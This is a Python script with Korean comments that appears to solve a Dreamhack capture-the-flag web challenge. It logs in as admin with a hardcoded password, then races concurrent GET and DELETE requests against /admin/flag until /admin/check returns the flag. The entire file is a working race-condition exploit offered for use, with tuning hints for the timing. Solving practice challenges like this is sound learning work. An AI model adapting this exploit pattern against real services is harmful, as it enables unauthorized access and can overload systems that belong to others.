import requests
from threading import Thread
import time
import sys

# [주의] 인스턴스가 새로 생성되었다면 URL의 포트 번호와 ADMIN_PW를 꼭 최신으로 업데이트하세요!
URL = "http://host3.dreamhack.games:8314"
ADMIN_PW = "e839ae822254a74f911c9b51c61e1455"

print("[*] 로그인 시도 중...")
try:
    r = requests.post(f'{URL}/user/login', data={
        'username': 'admin',
        'password': ADMIN_PW
    }).json()
    token = r['token']
except Exception as e:
    print(f"[!] 로그인 실패. URL 포트나 비밀번호를 다시 확인하세요. 에러: {e}")
    sys.exit()

header = {'Authorization': f'Bearer {token}'}

# 세션을 사용하여 TCP 연결을 재사용 (속도 향상 및 레이스 컨디션 성공률 극대화)
session = requests.Session()
session.headers.update(header)

def addflag():
    while True:
        try:
            # session을 사용하여 요청 속도 최적화
            session.get(f'{URL}/admin/flag', timeout=1)
            time.sleep(0.1) 
        except:
            pass

def removeflag():
    try:
        session.delete(f'{URL}/admin/flag', timeout=1)
    except:
        pass

# 스레드 가동
print("[*] 5개의 최적화된 배경 스레드(addflag) 가동...")
for i in range(5):
    t = Thread(target=addflag)
    t.daemon = True
    t.start()

print("\n[*] 자동 레이스 컨디션 공격을 시작합니다...")
print("[*] 플래그를 찾을 때까지 자동으로 반복합니다. 잠시만 기다려주세요!\n")

attempt_count = 0

while True:
    attempt_count += 1
    
    # 1. 플래그 삭제
    removeflag()
    
    # 2. 아주 짧은 대기 (addflag 스레드가 그 사이 플래그를 추가하길 기대함)
    # 타이밍이 안 맞으면 이 0.05라는 숫자를 0.01 ~ 0.1 사이로 조절해 보세요.
    time.sleep(0.05)
    
    try:
        # 3. 플래그 확인
        res = session.get(f'{URL}/admin/check', timeout=2).text
        
        if "DH{" in res:
            print(f"\n\n🎉🎉 [시도 횟수: {attempt_count}] 드디어 성공!! 🎉🎉")
            print(f"FLAG: {res}")
            break
        else:
            # 터미널 창이 꽉 차지 않도록 같은 줄에 덮어쓰며 진행 상황 표시
            print(f"\r[-] 시도 {attempt_count}: 실패 (서버 응답: {res})", end="")
            
    except requests.exceptions.Timeout:
        print(f"\r[-] 시도 {attempt_count}: 서버 응답 지연 중... 계속 시도합니다.", end="")
    except Exception as e:
        pass
        
    # 루프가 너무 빠르게 돌아 서버가 다운되는 것을 방지하기 위한 미세 딜레이
    time.sleep(0.1)